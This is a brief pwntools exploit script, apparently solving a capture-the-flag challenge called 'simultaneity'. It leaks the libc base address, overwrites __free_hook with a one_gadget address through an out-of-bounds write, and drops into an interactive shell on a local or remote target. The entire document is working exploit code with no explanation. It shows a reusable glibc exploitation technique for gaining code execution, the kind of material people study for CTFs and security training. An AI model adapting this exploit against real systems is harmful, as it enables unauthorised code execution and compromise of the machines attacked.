from pwn import *

context.binary = './simultaneity'

libc = ELF('./libc.so.6')

if args.REMOTE:
    p = remote(args.HOST, args.PORT)
else:
    p = context.binary.debug(gdbscript='''
    c
    ''')

libc_offs = -0x101000 + 0x10
one_gadget = 0x448a3

p.sendlineafter('?\n', str(0x100000-0x10))
p.recvuntil('here: 0x')
libc_base = int(p.recvline(), 16) - libc_offs
log.info(f'libc {libc_base:016x}')
p.sendlineafter('?\n', str((libc.symbols['__free_hook'] - libc_offs) // 8))
p.sendlineafter('?\n', '0'*0x1000 + str(one_gadget + libc_base))

p.interactive()
